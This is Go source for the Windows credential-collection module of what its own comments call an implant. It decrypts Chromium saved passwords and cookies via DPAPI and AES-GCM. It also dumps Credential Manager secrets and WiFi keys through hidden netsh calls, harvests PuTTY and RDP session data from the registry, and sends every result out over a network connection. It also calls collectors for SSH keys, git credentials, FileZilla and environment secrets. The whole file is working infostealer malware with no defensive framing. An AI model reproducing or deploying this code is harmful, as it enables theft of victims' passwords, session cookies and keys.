//go:build windows

package main

// Windows credential collection: DPAPI unwrapping for Chromium v10 keys,
// AES-256-GCM value decryption, Credential Manager enumeration, WiFi keys,
// PuTTY/RDP session metadata and the shared file/env collectors.
//
// Everything here uses the stdlib syscall package on purpose: the implant is
// built with CGO_ENABLED=0 for five targets and adding x/sys only for this is
// not worth the dependency surface.

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"unicode/utf16"
	"unicode/utf8"
	"unsafe"

	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
)

type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32  = syscall.NewLazyDLL("crypt32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	advapi32 = syscall.NewLazyDLL("advapi32.dll")

	procUnprotectData = crypt32.NewProc("CryptUnprotectData")
	procLocalFree     = kernel32.NewProc("LocalFree")
	procCredEnum      = advapi32.NewProc("CredEnumerateW")
	procCredFree      = advapi32.NewProc("CredFree")
)

func dpapiUnprotect(in []byte) ([]byte, error) {
	if len(in) == 0 {
		return nil, syscall.EINVAL
	}
	var out dataBlob
	inBlob := dataBlob{cbData: uint32(len(in)), pbData: &in[0]}
	r, _, err := procUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(out.pbData)))
	if out.cbData == 0 || out.pbData == nil {
		return nil, syscall.EINVAL
	}
	buf := unsafe.Slice(out.pbData, int(out.cbData))
	res := make([]byte, len(buf))
	copy(res, buf)
	return res, nil
}

// newSecretBox loads the profile master key from Local State (DPAPI wrapped).
func newSecretBox(br browserRoot) (*secretBox, string) {
	path := filepath.Join(br.path, "Local State")
	data, ok := readStoreFile(path)
	if !ok {
		return &secretBox{scheme: "none"}, "Local State 缺失"
	}
	var st struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if json.Unmarshal(data, &st) != nil || st.OSCrypt.EncryptedKey == "" {
		return &secretBox{scheme: "none"}, "无 os_crypt.encrypted_key"
	}
	raw, err := base64.StdEncoding.DecodeString(st.OSCrypt.EncryptedKey)
	if err != nil {
		return &secretBox{scheme: "none"}, "encrypted_key 解码失败"
	}
	if len(raw) > 5 && string(raw[:5]) == "DPAPI" {
		raw = raw[5:]
	}
	key, err := dpapiUnprotect(raw)
	if err != nil {
		return &secretBox{scheme: "none"}, "DPAPI 解包主密钥失败（跨用户上下文？）"
	}
	scheme := "v10 AES-256-GCM + DPAPI"
	if len(key) == 32 {
		return &secretBox{key: key, scheme: scheme}, scheme
	}
	return &secretBox{key: key, scheme: "legacy"}, "主密钥长度异常: " + itoa(len(key))
}

func (b *secretBox) decrypt(blob []byte, cookie bool) (string, bool) {
	if len(blob) == 0 {
		return "", false
	}
	// Legacy rows are raw DPAPI blobs with no version prefix.
	if len(blob) > 3 && string(blob[:3]) == "v10" && len(b.key) == 32 {
		block, err := aes.NewCipher(b.key)
		if err != nil {
			return "", false
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil || len(blob) < 3+gcm.NonceSize()+gcm.Overhead() {
			return "", false
		}
		nonce := blob[3 : 3+gcm.NonceSize()]
		ct := blob[3+gcm.NonceSize():]
		plain, err := gcm.Open(nil, nonce, ct, nil)
		if err != nil {
			return "", false
		}
		if cookie {
			plain = stripCookiePrefix(plain)
		}
		return string(plain), true
	}
	if len(blob) > 3 && string(blob[:3]) == "v20" {
		return "", false
	}
	plain, err := dpapiUnprotect(blob)
	if err != nil {
		return "", false
	}
	if cookie {
		plain = stripCookiePrefix(plain)
	}
	return string(plain), true
}

func (b *secretBox) failNote(blob []byte) string {
	if len(blob) > 3 && string(blob[:3]) == "v20" {
		return "v20 App-Bound 加密：需在浏览器进程内提权注入，本版本不解"
	}
	if len(b.key) == 0 {
		return "无主密钥，无法解密"
	}
	return "解密失败（可能来自其他用户配置）"
}

// ---------------------------------------------------------------------------
// Credential Manager
// ---------------------------------------------------------------------------

type credentialW struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        syscall.Filetime
	CredentialBlobSize uint32
	CredentialBlob     *byte
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

func collectCredMan(c net.Conn) {
	var count uint32
	var pCreds uintptr
	r, _, _ := procCredEnum.Call(0, 0, uintptr(unsafe.Pointer(&count)), uintptr(unsafe.Pointer(&pCreds)))
	if r == 0 || pCreds == 0 || count == 0 {
		return
	}
	defer procCredFree.Call(pCreds)
	ptrs := unsafe.Slice((**credentialW)(unsafe.Pointer(pCreds)), int(count))
	for _, cp := range ptrs {
		if cp == nil {
			continue
		}
		cred := *cp
		target := utf16Ptr(cred.TargetName)
		user := utf16Ptr(cred.UserName)
		secret := ""
		if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
			n := int(cred.CredentialBlobSize)
			raw := unsafe.Slice(cred.CredentialBlob, n)
			if cred.Type == 1 || cred.Type == 2 {
				u16 := make([]uint16, 0, n/2)
				for i := 0; i+1 < n; i += 2 {
					u16 = append(u16, *(*uint16)(unsafe.Pointer(&raw[i])))
				}
				secret = string(utf16.Decode(u16))
			} else {
				secret = base64.StdEncoding.EncodeToString(raw)
			}
		}
		emitCred(c, credRow{
			kind: "M", source: "CredMan", target: target, user: user, secret: secret,
			note: "type=" + itoa(int(cred.Type)), path: "Credential Manager",
		})
	}
}

func utf16Ptr(p *uint16) string {
	if p == nil {
		return ""
	}
	var out []uint16
	for ptr := unsafe.Pointer(p); ; ptr = unsafe.Pointer(uintptr(ptr) + 2) {
		v := *(*uint16)(ptr)
		if v == 0 {
			break
		}
		out = append(out, v)
		if len(out) > 4096 {
			break
		}
	}
	return string(utf16.Decode(out))
}

// ---------------------------------------------------------------------------
// WiFi (netsh, console output may be GBK)
// ---------------------------------------------------------------------------

func decodeConsole(b []byte) string {
	if utf8.Valid(b) {
		return string(b)
	}
	if out, _, err := transform.Bytes(simplifiedchinese.GBK.NewDecoder(), b); err == nil {
		return string(out)
	}
	return string(b)
}

func runHidden(name string, args ...string) string {
	cmd := exec.Command(name, args...)
	hideWindow(cmd)
	out, err := cmd.CombinedOutput()
	if err != nil && len(out) == 0 {
		return ""
	}
	return decodeConsole(out)
}

func collectWiFi(c net.Conn) {
	out := runHidden("netsh", "wlan", "show", "profiles")
	var names []string
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		i := strings.LastIndex(line, ":")
		if i < 0 {
			continue
		}
		name := strings.TrimSpace(line[i+1:])
		if name == "" || strings.Contains(line, "<") {
			continue
		}
		if strings.Contains(line, "Profile") || strings.Contains(line, "配置") {
			names = append(names, name)
		}
	}
	for _, name := range names {
		detail := runHidden("netsh", "wlan", "show", "profile", "name="+name, "key=clear")
		key := ""
		auth := ""
		for _, line := range strings.Split(detail, "\n") {
			l := strings.TrimSpace(line)
			val := ""
			if i := strings.LastIndex(l, ":"); i >= 0 {
				val = strings.TrimSpace(l[i+1:])
			}
			switch {
			case strings.Contains(l, "Key Content"), strings.Contains(l, "关键内容"):
				key = val
			case strings.Contains(l, "Authentication"), strings.Contains(l, "身份验证"):
				auth = val
			}
		}
		note := "netsh key=clear"
		if auth != "" {
			note += " · " + auth
		}
		emitCred(c, credRow{kind: "W", source: "WiFi", target: name, secret: key, note: note})
	}
	if len(names) > 0 {
		emitCred(c, credRow{kind: "N", source: "WiFi", target: "配置文件", note: itoa(len(names)) + " 个"})
	}
}

// ---------------------------------------------------------------------------
// PuTTY / RDP sessions (registry through reg.exe keeps this dependency-free)
// ---------------------------------------------------------------------------

func regQuery(key string) string {
	return runHidden("reg", "query", key, "/s")
}

func collectPuTTY(c net.Conn) {
	out := regQuery(`HKCU\Software\SimonTatham\PuTTY\Sessions`)
	if out == "" {
		return
	}
	session := ""
	for _, line := range strings.Split(out, "\n") {
		l := strings.TrimSpace(line)
		if strings.HasPrefix(l, "HKEY_CURRENT_USER") {
			session = filepath.Base(strings.ReplaceAll(l, `\`, "/"))
			continue
		}
		f := strings.Fields(l)
		if len(f) < 3 || f[1] != "REG_SZ" {
			continue
		}
		val := strings.Join(f[2:], " ")
		switch f[0] {
		case "HostName":
			emitCred(c, credRow{kind: "P", source: "PuTTY", target: val, note: session, path: "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"})
			_ = val
		case "UserName":
			user := val
			emitCred(c, credRow{kind: "P", source: "PuTTY", target: session, user: user, note: "保存的会话（密码默认不落盘）", path: "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"})
		}
	}
}

func collectRDP(c net.Conn) {
	out := regQuery(`HKCU\Software\Microsoft\Terminal Server Client\Servers`)
	if out == "" {
		return
	}
	host := ""
	for _, line := range strings.Split(out, "\n") {
		l := strings.TrimSpace(line)
		if strings.HasPrefix(l, "HKEY_CURRENT_USER") {
			host = filepath.Base(strings.ReplaceAll(l, `\`, "/"))
			continue
		}
		f := strings.Fields(l)
		if len(f) >= 3 && f[0] == "UsernameHint" && f[1] == "REG_SZ" {
			emitCred(c, credRow{kind: "R", source: "RDP", target: host, user: strings.Join(f[2:], " "), note: "RDP 历史目标", path: "HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers"})
		}
	}
}

func collectSystemCreds(c net.Conn) {
	collectCredMan(c)
	collectWiFi(c)
	collectPuTTY(c)
	collectRDP(c)
	fileZilla(c)
	dotfileSecrets(c)
	gitCredentials(c)
	sshKeys(c)
	envSecrets(c)
	_ = os.Getenv("USERPROFILE")
}
